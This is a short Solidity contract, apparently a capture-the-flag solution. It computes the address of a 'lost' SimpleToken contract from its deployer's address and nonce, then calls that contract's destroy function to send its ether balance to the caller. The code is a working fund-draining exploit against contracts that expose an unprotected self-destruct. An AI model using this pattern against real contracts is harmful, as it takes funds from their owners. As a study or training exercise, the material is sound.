// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleToken.sol";

contract Recover{
    SimpleToken public SimpleTokenContract;

    function Retrive(address payable sender) external {
        address payable lostcontract = payable(address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)))))));

        SimpleTokenContract = SimpleToken(lostcontract);
        SimpleTokenContract.destroy(payable(msg.sender));
    }

}
